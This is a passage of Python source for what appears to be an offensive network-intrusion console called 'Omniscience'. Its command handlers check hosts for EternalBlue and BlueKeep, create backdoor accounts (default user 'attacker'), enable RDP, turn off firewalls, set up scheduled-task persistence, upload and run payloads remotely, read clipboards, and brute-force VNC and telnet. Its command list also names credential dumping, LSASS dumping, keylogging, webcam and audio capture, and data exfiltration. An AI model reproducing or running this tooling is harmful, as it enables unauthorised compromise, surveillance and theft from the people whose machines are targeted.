                        print(f"  {Fore.YELLOW}  Detail: {result['error_detail']}\n")
                else:
                    Visualizer.alert("Control module not loaded", "warn")

            elif cmd in ("etblue-check", "eternalblue-check") and args:
                target = args[0]
                Visualizer.alert(f"EternalBlue (CVE-2017-0143) check on {target} ...", "hack")
                if self.control and hasattr(self.control, 'smb_check_vulns'):
                    result = self.control.smb_check_vulns(target)
                    vuln = "SMB_VULNERABLE_MS17_010" in result.get("vulns", [])
                    color = Fore.RED if vuln else Fore.GREEN
                    status = "VULNERABLE TO ETERNALBLUE" if vuln else "NOT VULNERABLE / PATCHED"
                    print(f"\n  {color}{Style.BRIGHT}  CVE-2017-0143 (EternalBlue)  │  {status}")
                    print(f"  {Fore.WHITE}  Target  : {target}")
                    print(f"  {Fore.WHITE}  Vulns   : {', '.join(result.get('vulns', [])) or 'none'}\n")
                else:
                    Visualizer.alert("Control module not loaded", "warn")

            elif cmd in ("bluekeep-check", "rdp-vuln") and args:
                target = args[0]
                Visualizer.alert(f"BlueKeep (CVE-2019-0708) RDP check on {target} ...", "hack")
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(3)
                    rdp_open = s.connect_ex((target, 3389)) == 0
                    s.close()
                    if rdp_open:
                        print(f"\n  {Fore.YELLOW}{Style.BRIGHT}  CVE-2019-0708 (BlueKeep)  │  RDP PORT OPEN (3389)")
                        print(f"  {Fore.WHITE}  Target: {target}  │  Check Windows version: Win7/Server 2008 = VULNERABLE")
                    else:
                        print(f"\n  {Fore.GREEN}{Style.BRIGHT}  CVE-2019-0708 (BlueKeep)  │  RDP PORT CLOSED")
                        print(f"  {Fore.WHITE}  Target: {target}\n")
                except Exception as e:
                    Visualizer.alert(f"BlueKeep check error: {e}", "error")

            elif cmd in ("smb-vulns", "smb-scan") and args:
                target = args[0]
                Visualizer.alert(f"Full SMB vulnerability scan (Win7→Win11) on {target} ...", "hack")
                if self.control and hasattr(self.control, 'smb_check_vulns'):
                    result = self.control.smb_check_vulns(target)
                    vulns = result.get("vulns", [])
                    info  = result.get("info", {})
                    print(f"\n  {Fore.CYAN}{Style.BRIGHT}SMB Vulnerability Scan: {target}")
                    print(f"  {Fore.BLUE}{'─'*56}")
                    if vulns:
                        for v in vulns:
                            if "VULN" in v or "GHOST" in v or "NIGHTMARE" in v or "POTAM" in v:
                                print(f"  {Fore.RED}{Style.BRIGHT}  ☠  {v}")
                            elif "OPEN" in v or "DETECT" in v or "ENABLE" in v:
                                print(f"  {Fore.YELLOW}{Style.BRIGHT}  ⚠  {v}")
                            else:
                                print(f"  {Fore.WHITE}  •  {v}")
                    else:
                        print(f"  {Fore.GREEN}  No critical vulnerabilities detected")
                    print(f"  {Fore.BLUE}{'─'*56}")
                    print(f"  {Fore.WHITE}  SMB Info: {json.dumps(info, indent=2)}\n")
                else:
                    Visualizer.alert("Control module not loaded", "warn")

            # ==================== PERSISTENCE ====================
            elif cmd == "adduser" and len(args) >= 1:
                target = self.selected_target
                u = args[0]
                p = args[1] if len(args) > 1 else "Password123!"
                
                if args[0].count('.') >= 3: # IP provided
                    target = args[0]
                    u = args[1] if len(args) > 1 else "attacker"
                    p = args[2] if len(args) > 2 else "Password123!"
                    
                if not target:
                    print(f"{Fore.RED}[!] No target selected.")
                    return
                    
                if self.control and hasattr(self.control, 'add_local_user'):
                    self.control.add_local_user(target, self.credentials["user"], self.credentials["pass"], u, p)
                    print(f"[+] User {u} created on {target}")

            elif cmd == "rdp-enable":
                target = args[0] if args else self.selected_target
                if not target:
                    print(f"{Fore.RED}[!] No target selected.")
                    return
                if self.control and hasattr(self.control, 'enable_rdp'):
                    self.control.enable_rdp(target, self.credentials["user"], self.credentials["pass"])
                    print(f"[+] RDP enabled on {target}")

            elif cmd == "firewall-off":
                target = args[0] if args else self.selected_target
                if not target:
                    print(f"{Fore.RED}[!] No target selected.")
                    return
                if self.control and hasattr(self.control, 'disable_firewall'):
                    self.control.disable_firewall(target, self.credentials["user"], self.credentials["pass"])
                    print(f"[+] Firewall disabled on {target}")

            elif cmd == "firewall-on" and args:
                if self.control and hasattr(self.control, 'enable_firewall'):
                    self.control.enable_firewall(args[0], self.credentials["user"], self.credentials["pass"])
                    print(f"[+] Firewall enabled")

            elif cmd == "firewall-add" and len(args) >= 2:
                if self.control and hasattr(self.control, 'add_firewall_exception'):
                    self.control.add_firewall_exception(args[0], self.credentials["user"], self.credentials["pass"], int(args[1]))
                    print(f"[+] Firewall rule added")

            elif cmd == "persist-task":
                target = self.selected_target
                task_name = args[0] if len(args) > 0 else "SystemUpdate"
                task_path = args[1] if len(args) > 1 else "notepad.exe"
                
                if len(args) > 0 and args[0].count('.') >= 3:
                    target = args[0]
                    task_name = args[1] if len(args) > 1 else "SystemUpdate"
                    task_path = args[2] if len(args) > 2 else "notepad.exe"
                    
                if not target:
                    print(f"{Fore.RED}[!] No target selected.")
                    return
                    
                if self.control and hasattr(self.control, 'create_scheduled_task'):
                    self.control.create_scheduled_task(target, self.credentials["user"], self.credentials["pass"], task_name, task_path)
                    print(f"[+] Task {task_name} created on {target}")
                
            # ==================== SYSTEM ====================
            elif cmd == "shutdown":
                target = args[0] if args else self.selected_target
                if not target:
                    print(f"{Fore.RED}[!] No target selected.")
                    return
                if self.control and hasattr(self.control, 'shutdown'):
                    self.control.shutdown(target, self.credentials["user"], self.credentials["pass"], "shutdown")
                    print(f"[+] Shutdown sent to {target}")

            elif cmd == "reboot":
                target = args[0] if args else self.selected_target
                if not target:
                    print(f"{Fore.RED}[!] No target selected.")
                    return
                if self.control and hasattr(self.control, 'shutdown'):
                    self.control.shutdown(target, self.credentials["user"], self.credentials["pass"], "reboot")
                    print(f"[+] Reboot sent to {target}")

            # ==================== FILES ====================
            elif cmd == "upload" and len(args) >= 1:
                target = self.selected_target
                src = args[0]
                dst = args[1] if len(args) > 1 else "C$\\temp\\omni.exe"
                
                if args[0].count('.') >= 3:
                    target = args[0]
                    src = args[1] if len(args) > 1 else ""
                    dst = args[2] if len(args) > 2 else "C$\\temp\\omni.exe"
                    
                if not target or not src:
                    print(f"{Fore.RED}[!] Usage: upload [ip] <src> <dst>")
                    return
                    
                if self.control and hasattr(self.control, 'smb_upload'):
                    # Parsing dst for C$ etc if needed, but assuming simple path for now
                    self.control.smb_upload(target, src, "C$", dst.replace("C$\\", "").replace("C$:", ""), self.credentials["user"], self.credentials["pass"])
                    print(f"[+] Uploaded to {target}")

            elif cmd == "download" and len(args) >= 1:
                target = self.selected_target
                remote = args[0]
                local = args[1] if len(args) > 1 else "downloaded_file"
                
                if args[0].count('.') >= 3:
                    target = args[0]
                    remote = args[1] if len(args) > 1 else ""
                    local = args[2] if len(args) > 2 else "downloaded_file"
                    
                if not target or not remote:
                    self._log(f"{Fore.RED}[!] Usage: download [ip] <remote> <local>")
                    return
                    
                if self.control and hasattr(self.control, 'smb_download'):
                    self.control.smb_download(target, "C$", remote.replace("C$\\", "").replace("C$:", ""), local, self.credentials["user"], self.credentials["pass"])
                    self._log(f"[+] Downloaded from {target}")

            elif cmd == "file list" or (cmd == "file" and len(args) >= 1 and args[0] == "list"):
                path = args[1] if len(args) > 1 else "C:\\"
                target = self.selected_target
                if not target:
                    print(f"{Fore.RED}[!] No target selected.")
                    return
                if self.control and hasattr(self.control, 'remote_file_manager'):
                    result = self.control.remote_file_manager(target, self.credentials["user"], self.credentials["pass"], "list", path)
                    print(f"{json.dumps(result, indent=2)}")

            elif cmd == "file upload" or (cmd == "file" and len(args) >= 2 and args[0] == "upload"):
                local = args[1]
                remote = args[2] if len(args) > 2 else "C:\\temp\\" + os.path.basename(local)
                target = self.selected_target
                if not target:
                    print(f"{Fore.RED}[!] No target selected.")
                    return
                if self.control and hasattr(self.control, 'smb_upload'):
                    self.control.smb_upload(target, local, "C$", remote.replace("C$\\", ""), self.credentials["user"], self.credentials["pass"])
                    print(f"[+] File uploaded")

            elif cmd == "file download" or (cmd == "file" and len(args) >= 2 and args[0] == "download"):
                remote = args[1]
                local = args[2] if len(args) > 2 else os.path.basename(remote)
                target = self.selected_target
                if not target:
                    print(f"{Fore.RED}[!] No target selected.")
                    return
                if self.control and hasattr(self.control, 'smb_download'):
                    self.control.smb_download(target, "C$", remote.replace("C$\\", ""), local, self.credentials["user"], self.credentials["pass"])
                    print(f"[+] File downloaded")

            elif cmd == "file delete" or (cmd == "file" and len(args) >= 2 and args[0] == "delete"):
                path = args[1]
                target = self.selected_target
                if not target:
                    print(f"{Fore.RED}[!] No target selected.")
                    return
                if self.control and hasattr(self.control, 'remote_file_manager'):
                    self.control.remote_file_manager(target, self.credentials["user"], self.credentials["pass"], "delete", path)
                    print(f"[+] File deleted")

            elif cmd == "file execute" or (cmd == "file" and len(args) >= 2 and args[0] == "execute"):
                path = args[1]
                target = self.selected_target
                if not target:
                    print(f"{Fore.RED}[!] No target selected.")
                    return
                if self.control and hasattr(self.control, 'wmi_exec'):
                    self.control.wmi_exec(target, self.credentials["user"], self.credentials["pass"], path)
                    print(f"[+] Execution requested")

            elif cmd == "media play" or (cmd == "media" and len(args) >= 1 and args[0] == "play"):
                file = args[1] if len(args) > 1 else ""
                target = self.selected_target
                if not target:
                    print(f"{Fore.RED}[!] No target selected.")
                    return
                if self.control and hasattr(self.control, 'remote_media_control'):
                    self.control.remote_media_control(target, self.credentials["user"], self.credentials["pass"], "play", file)
                    print(f"[+] Media play command sent")

            elif cmd == "media volume_up" or (cmd == "media" and len(args) >= 1 and args[0] == "volume_up"):
                target = self.selected_target
                if not target:
                    print(f"{Fore.RED}[!] No target selected.")
                    return
                if self.control and hasattr(self.control, 'remote_media_control'):
                    self.control.remote_media_control(target, self.credentials["user"], self.credentials["pass"], "volume_up", None)
                    print(f"[+] Volume increased")

            elif cmd == "media volume_down" or (cmd == "media" and len(args) >= 1 and args[0] == "volume_down"):
                target = self.selected_target
                if not target:
                    print(f"{Fore.RED}[!] No target selected.")
                    return
                if self.control and hasattr(self.control, 'remote_media_control'):
                    self.control.remote_media_control(target, self.credentials["user"], self.credentials["pass"], "volume_down", None)
                    print(f"[+] Volume decreased")

            elif cmd == "media cd_open" or (cmd == "media" and len(args) >= 1 and args[0] == "cd_open"):
                target = self.selected_target
                if not target:
                    print(f"{Fore.RED}[!] No target selected.")
                    return
                if self.control and hasattr(self.control, 'remote_media_control'):
                    self.control.remote_media_control(target, self.credentials["user"], self.credentials["pass"], "cd_open", None)
                    print(f"[+] CD tray opened")

            # ==================== MISSING COMMANDS ====================
            elif cmd == "ssh-exec" and len(args) >= 1:
                target = self.selected_target
                cmd_to_run = " ".join(args)
                if args[0].count('.') >= 3:
                    target = args[0]
                    cmd_to_run = " ".join(args[1:])
                if not target:
                    print(f"{Fore.RED}[!] No target selected.")
                    return
                if self.control and hasattr(self.control, 'ssh_exec'):
                    res = self.control.ssh_exec(target, self.credentials["user"], self.credentials["pass"], cmd_to_run)
                    print(f"{res}")

            elif cmd == "clipboard-get":
                target = args[0] if args else self.selected_target
                if not target:
                    print(f"{Fore.RED}[!] No target selected.")
                    return
                if self.control and hasattr(self.control, 'get_clipboard'):
                    clip = self.control.get_clipboard(target, self.credentials["user"], self.credentials["pass"])
                    print(f"Clipboard: {clip}")

            elif cmd == "clipboard-set" and len(args) >= 1:
                target = self.selected_target
                txt = " ".join(args)
                if args[0].count('.') >= 3:
                    target = args[0]
                    txt = " ".join(args[1:])
                if not target:
                    print(f"{Fore.RED}[!] No target selected.")
                    return
                if self.control and hasattr(self.control, 'set_clipboard'):
                    self.control.set_clipboard(target, self.credentials["user"], self.credentials["pass"], txt)
                    print(f"[+] Clipboard set")

            elif cmd == "svc-list":
                target = args[0] if args else self.selected_target
                if not target:
                    print(f"{Fore.RED}[!] No target selected.")
                    return
                if self.control and hasattr(self.control, 'list_services'):
                    svcs = self.control.list_services(target, self.credentials["user"], self.credentials["pass"])
                    Visualizer.table(["NAME", "STATUS", "STARTTYPE"], [[s.get('Name','?'), s.get('Status','?'), s.get('StartMode','?')] for s in svcs[:30]], "SERVICES")

            elif cmd == "processes":
                target = args[0] if args else self.selected_target
                if not target:
                    print(f"{Fore.RED}[!] No target selected.")
                    return
                if self.control and hasattr(self.control, 'list_processes'):
                    procs = self.control.list_processes(target, self.credentials["user"], self.credentials["pass"])
                    Visualizer.table(["PID", "NAME", "MEM", "USER"], [[p.get('ProcessId','?'), p.get('Name','?'), p.get('WorkingSetSize','0'), p.get('User','?')] for p in procs[:30]], "PROCESSES")

            elif cmd == "vnc-brute" and args:
                if self.control and hasattr(self.control, 'vnc_brute_force'):
                    result = self.control.vnc_brute_force(args[0])
                    print(f"{json.dumps(result, indent=2)}")

            elif cmd == "telnet-brute" and args:
                if self.control and hasattr(self.control, 'telnet_brute_force'):
                    result = self.control.telnet_brute_force(args[0])
                    print(f"{json.dumps(result, indent=2)}")

            elif cmd == "setdomain":
                if args:
                    self.credentials["domain"] = args[0]
                    print(f"[+] Domain set to: {args[0]}")
                else:
                    print(f"Current domain: {self.credentials['domain'] or 'NONE'}")

            else:
                # Intelligent command not found handler
                HackerSounds.invalid_command()
                
                # Levenshtein distance for command suggestions
                def levenshtein(s1, s2):
                    if len(s1) < len(s2):
                        return levenshtein(s2, s1)
                    if len(s2) == 0:
                        return len(s1)
                    previous_row = range(len(s2) + 1)
                    for i, c1 in enumerate(s1):
                        current_row = [i + 1]
                        for j, c2 in enumerate(s2):
                            insertions = previous_row[j + 1] + 1
                            deletions = current_row[j] + 1
                            substitutions = previous_row[j] + (c1 != c2)
                            current_row.append(min(insertions, deletions, substitutions))
                        previous_row = current_row
                    return previous_row[-1]
                
                all_commands = ['help', 'exit', 'quit', 'clear', 'history', 'auto', 'globalscan', 'scan', 'fastscan', 'targets', 'select', 'target', 'attack', 'pwnall', 'pwn', 'exploit', 'mobile', 'scan-exploit', 'smbghost', 'printnightmare', 'petitpotam', 'zerologon', 'smb-vulns', 'etblue-check', 'bluekeep-check', 'kerberoast', 'password-spray', 'lateral', 'db-dump', 'exfiltrate', 'exec', 'screen', 'monitor', 'live', 'webcam', 'audio', 'keylog', 'shutdown', 'reboot', 'winrm-exec', 'sysinfo', 'systeminfo', 'extract', 'harvest', 'steal-wifi', 'stealcreds', 'lsass-dump', 'tokens', 'nethashes', 'vault', 'omnifetch', 'db-extract', 'cloud-attack', 's3-scan', 'mysql-root', 'postgres', 'file', 'upload', 'download', 'persist', 'persist-task', 'adduser', 'rdp-enable', 'firewall-off', 'firewall-on', 'firewall-add', 'media', 'pslist', 'killproc', 'svc-list', 'processes', 'sniff', 'stopsniff', 'creds', 'dns-log', 'ssh-brute', 'rdp-brute', 'vnc-brute', 'telnet-brute', 'dashboard', 'status', 'gateway', 'external-ip', 'setcreds', 'setdomain', 'clipboard-get', 'clipboard-set', 'arp', 'icmp', 'netbios', 'snmp', 'mdns', 'nopac', 'etblue-check']
                
                suggestions = []
                for command in all_commands:
                    dist = levenshtein(cmd, command)
                    if dist <= 3:
                        suggestions.append((dist, command))
                
                suggestions.sort()
                
                self._log(f"\n{Fore.RED}{Style.BRIGHT}✘  UNKNOWN COMMAND: {Fore.WHITE}{cmd}")
                if suggestions:
                    self._log(f"\n{Fore.YELLOW}   Did you mean:")
                    for dist, command in suggestions[:3]:
                        self._log(f"{Fore.GREEN}     • {command}")
                self._log(f"\n{Fore.CYAN}   Type 'help' for full command list with 140+ commands\n")

        except Exception as e:
            HackerSounds.command_error()
            self._log(f"\n{Fore.RED}{Style.BRIGHT}✘  COMMAND FAILED")
            self._log(f"{Fore.RED}   Error: {str(e)}")
            import traceback
            logger.error(f"Command failed: {cmd} | Error: {str(e)} | Traceback: {traceback.format_exc()}")
            self._log(f"\n{Fore.YELLOW}   The error has been logged. Use 'help' for correct syntax.\n")

    def _show_hosts_table(self):
        if not self.hosts:
            self._log("No hosts discovered.")
            return
        headers = ["ID", "IP Address", "Status"]
        rows = []
        for i, host in enumerate(self.hosts):
            ip = host if isinstance(host, str) else (host.get('ip') if isinstance(host, dict) else getattr(host, 'ip', str(host)))
            status = "Discovered"
            rows.append([str(i), ip, status])
        Visualizer.table(headers, rows, "Discovered Hosts")

    def _handle_tree_command(self, tree_cmd, sub_cmd, tree_args):
        """Handle tree-based commands like scan, exploit, control, etc."""
        try:
            HackerSoundsEx.on_action()
        except: pass
        
        target = self.selected_target
        
        if tree_cmd == "scan":
            if sub_cmd == "auto":
                self.process_command("auto")
                return True
            elif sub_cmd == "fast":
                self.process_command("fastscan")
                return True
            elif sub_cmd == "deep" and tree_args:
                self.process_command(f"scan {tree_args[0]}")
                return True
            elif sub_cmd == "arp":
                self.process_command(f"arp {tree_args[0] if tree_args else ''}")
                return True
            elif sub_cmd == "icmp":
                self.process_command(f"icmp {tree_args[0] if tree_args else ''}")
                return True
            elif sub_cmd == "netbios" and tree_args:
                self.process_command(f"netbios {tree_args[0]}")
                return True
            elif sub_cmd == "snmp" and tree_args:
                self.process_command(f"snmp {tree_args[0]}")
                return True
            elif sub_cmd == "mdns":
                self.process_command("mdns")
                return True
            elif sub_cmd == "ssdp":
                self.process_command("ssdp")
                return True
            elif sub_cmd == "range" and tree_args:
                self.process_command(f"scan {tree_args[0]}")
                return True
            elif sub_cmd == "cloud" and tree_args:
                self.process_command(f"cloud-scan {tree_args[0]}")
                return True
        
        elif tree_cmd == "exploit":
            if sub_cmd == "auto" and tree_args:
                self.process_command(f"pwn {tree_args[0]}")
                return True
            elif sub_cmd == "smb" and tree_args:
                ip = tree_args[1] if len(tree_args) > 1 and '.' in str(tree_args[1]) else (self.selected_target or "")
                smb_action = tree_args[0] if tree_args[0] in ['ghost', 'blue', 'vulns'] else 'vulns'
                if smb_action == "ghost":
                    self.process_command(f"smbghost {ip}")
                elif smb_action == "blue":
                    self.process_command(f"etblue-check {ip}")
                elif smb_action == "vulns":
                    self.process_command(f"smb-vulns {ip}")
                return True
            elif sub_cmd == "rdp" and tree_args:
                ip = tree_args[1] if len(tree_args) > 1 and '.' in str(tree_args[1]) else (self.selected_target or "")
                if tree_args[0] == "bluekeep":
                    self.process_command(f"bluekeep-check {ip}")
                elif tree_args[0] == "brute":
                    self.process_command(f"rdp-brute {ip}")
                return True
            elif sub_cmd == "print" and tree_args:
                ip = tree_args[1] if len(tree_args) > 1 and '.' in str(tree_args[1]) else (self.selected_target or "")
                if tree_args[0] == "nightmare":
                    self.process_command(f"printnightmare {ip}")
                elif tree_args[0] == "spooler":
                    self.process_command(f"smb-vulns {ip}")
                return True
            elif sub_cmd == "ntlm" and tree_args:
                ip = tree_args[1] if len(tree_args) > 1 and '.' in str(tree_args[1]) else (self.selected_target or "")
                if tree_args[0] == "petitpotam":
                    self.process_command(f"petitpotam {ip}")
                elif tree_args[0] == "zerologon":
                    self.process_command(f"zerologon {ip}")
                elif tree_args[0] == "nopac":
                    self.process_command(f"nopac {ip}")
                return True
            elif sub_cmd == "ssh" and tree_args:
                ip = tree_args[1] if len(tree_args) > 1 and '.' in str(tree_args[1]) else (self.selected_target or "")
                if tree_args[0] == "brute":
                    self.process_command(f"ssh-brute {ip}")
                elif tree_args[0] == "exec" and ip:
                    cmd = " ".join(tree_args[2:]) if len(tree_args) > 2 else "whoami"
                    self.process_command(f"ssh-exec {ip} {cmd}")
                return True
        
        elif tree_cmd == "control":
            if sub_cmd == "exec" and tree_args:
                self.process_command(f"exec {' '.join(tree_args)}")
                return True
            elif sub_cmd == "shell":
                self.process_command("exec cmd.exe")
                return True
            elif sub_cmd == "powershell" and tree_args:
                self.process_command(f"exec powershell -Command {' '.join(tree_args)}")
                return True
            elif sub_cmd == "upload" and tree_args:
                local = tree_args[0]
                remote = tree_args[1] if len(tree_args) > 1 else "C$tempomni.exe"
                self.process_command(f"upload {local} {remote}")
                return True
            elif sub_cmd == "download" and tree_args:
                remote = tree_args[0]
                local = tree_args[1] if len(tree_args) > 1 else "downloaded"
                self.process_command(f"download {remote} {local}")
                return True
        
        elif tree_cmd == "gather":
            if sub_cmd == "all":
                self.process_command("extract")
                return True
            elif sub_cmd == "creds":
                self.process_command("stealcreds")
                return True
            elif sub_cmd == "wifi":
                self.process_command("steal-wifi")
                return True
            elif sub_cmd == "browser":
                self.process_command("omnifetch")
                return True
            elif sub_cmd == "tokens":
                self.process_command("tokens")
                return True
            elif sub_cmd == "hashes":
                self.process_command("nethashes")
                return True
            elif sub_cmd == "lsass":
                self.process_command("lsass-dump")
                return True
            elif sub_cmd == "vault":
                self.process_command("vault")
                return True
        
        elif tree_cmd == "persistence":
            if sub_cmd == "auto":
                self.process_command("persist")
                return True
            elif sub_cmd == "service" and len(tree_args) >= 2:
                self.process_command(f"persist-task {tree_args[0]} {tree_args[1]}")
                return True
            elif sub_cmd == "registry" and len(tree_args) >= 2:
                self.process_command(f"persist-task {tree_args[0]} {tree_args[1]}")
                return True
            elif sub_cmd == "scheduled" and len(tree_args) >= 2:
                self.process_command(f"persist-task {tree_args[0]} {tree_args[1]}")
                return True
        
        elif tree_cmd == "lateral":
            if sub_cmd == "scan":
                self.process_command("auto")
                return True
            elif sub_cmd == "psexec" and tree_args:
                self.process_command(f"lateral {self.selected_target or ''} {tree_args[0]}")
                return True
            elif sub_cmd == "winrm" and tree_args:
                self.process_command(f"winrm-exec {tree_args[0]} whoami")
                return True
            elif sub_cmd == "ssh" and tree_args:
                self.process_command(f"ssh-exec {tree_args[0]} whoami")
                return True
        
        elif tree_cmd == "monitor":
            if sub_cmd == "screen":
                self.process_command("screen")
                return True
            elif sub_cmd == "keys":
                self.process_command("keylog")
                return True
            elif sub_cmd == "clipboard":
                self.process_command("clipboard-get")
                return True
            elif sub_cmd == "webcam":
                self.process_command("webcam")
                return True
            elif sub_cmd == "audio":
                dur = tree_args[0] if tree_args else "10"
                self.process_command(f"audio {dur}")
                return True
            elif sub_cmd == "process":
                self.process_command("pslist")
                return True
        
        elif tree_cmd == "db":
            if sub_cmd == "mysql" and len(tree_args) >= 1:
                if tree_args[0] == "root" and len(tree_args) > 1:
                    self.process_command(f"mysql-root {tree_args[1]}")
                elif tree_args[0] == "dump" and len(tree_args) > 2:
                    self.process_command(f"db-extract {tree_args[1]} 3306 mysql")
                return True
            elif sub_cmd == "postgres" and len(tree_args) >= 1:
                if tree_args[0] == "root" and len(tree_args) > 1:
                    self.process_command(f"postgres {tree_args[1]}")
                elif tree_args[0] == "dump" and len(tree_args) > 2:
                    self.process_command(f"db-extract {tree_args[1]} 5432 postgres")
                return True
            elif sub_cmd == "mssql" and len(tree_args) >= 1:
                if tree_args[0] == "exec" and len(tree_args) > 2:
                    self.process_command(f"db-extract {tree_args[1]} 1433 mssql")
                return True
        
        elif tree_cmd == "cloud":
            if sub_cmd == "aws" and len(tree_args) >= 1:
                if tree_args[0] == "s3" and len(tree_args) > 1:
                    self.process_command(f"s3-scan {tree_args[1]}")
                else:
                    self.process_command("cloud-scan aws")
                return True
            elif sub_cmd == "azure" and len(tree_args) >= 1:
                self.process_command("cloud-scan azure")
                return True
        
        elif tree_cmd == "show":
            if sub_cmd == "targets":
                self.process_command("targets")
                return True
            elif sub_cmd == "sessions":
                self._log(f"{Fore.CYAN}Active Sessions:")
                self._log(f"  Compromised: {len(self.compromised)}")
                self._log(f"  Targeting: {len(self.targeting)}")
                return True
            elif sub_cmd == "network":
                self.process_command("network")
                return True
            elif sub_cmd == "modules":
                mods_ok = sum(1 for x in [self.discovery, self.intel, self.control, self.adv_scan, self.center, self.universal] if x)
                self._log(f"{Fore.CYAN}Loaded Modules: {mods_ok}/6")
                return True
        
        elif tree_cmd == "set":
            if sub_cmd == "target" and tree_args:
                self.process_command(f"target {tree_args[0]}")
                return True
            elif sub_cmd == "creds" and len(tree_args) >= 2:
                self.process_command(f"setcreds {tree_args[0]} {tree_args[1]}")
                return True
            elif sub_cmd == "domain" and tree_args:
                self.process_command(f"setdomain {tree_args[0]}")
                return True
            elif sub_cmd == "interface" and tree_args:
                try:
                    self.selected_interface = int(tree_args[0])
                    self._log(f"{Fore.GREEN}Interface set to {tree_args[0]}")
                except: pass
                return True
        
        return False

    def _display_right_panel(self):
        try:
            Visualizer.draw_right_sidebar()
        except:
            pass

    def _print_dashboard(self):
        self._log(f"\n{Fore.CYAN}{Style.BRIGHT}╔════════════════════════════════════════════════════════════╗")
        self._log(f"{Fore.CYAN}{Style.BRIGHT}║                  OMNISCIENCE SYSTEM DASHBOARD                 ║")
        self._log(f"{Fore.CYAN}{Style.BRIGHT}╠════════════════════════════════════════════════════════════╣")
        self._log(f"{Fore.LIGHTGREEN_EX}  Hosts Discovered: {len(self.hosts)}")
        self._log(f"{Fore.LIGHTGREEN_EX}  Selected Target: {self.selected_target or 'None'}")
        self._log(f"{Fore.LIGHTGREEN_EX}  Credentials: {self.credentials['user']} / {'*' * len(self.credentials['pass'])}")
        self._log(f"{Fore.LIGHTGREEN_EX}  Active Modules: {sum(1 for x in [self.discovery, self.intel, self.control, self.adv_scan, self.center, self.universal] if x)}/6")
        self._log(f"{Fore.LIGHTGREEN_EX}  Session Uptime: {str(datetime.now() - self._start_time).split('.')[0]}")
        self._log(f"{Fore.CYAN}{Style.BRIGHT}╚════════════════════════════════════════════════════════════╝\n")

if __name__ == "__main__":
    import sys
    import subprocess

    # Check if we're in a new window
    if len(sys.argv) > 1 and sys.argv[1] == "--new-window":
        # We're in the new window, run the CLI
        # Advanced hacking welcome sequence
        MatrixEffects.advanced_welcome()

        # Initialize and run the shell
        shell = OmniShell()
        shell.run()
    else:
        # Launch new command line window
        try:
            # Get the current Python executable and script path
            python_exe = sys.executable
            script_path = sys.argv[0]

            # Launch new maximized cmd window
            cmd = f'cmd /c start /max "" "{python_exe}" "{script_path}" --new-window'
            subprocess.Popen(cmd, shell=True)

            # Play launch sound and exit current process
            HackerSounds.access_granted()
            print(f"{Fore.GREEN}Launching Omniscience Command Interface...")
            time.sleep(1)
            sys.exit(0)
        except Exception as e:
            print(f"Failed to launch new window: {e}")
            # Fallback to current window
            MatrixEffects.intro_cycle(12)
            shell = OmniShell()
            shell.run()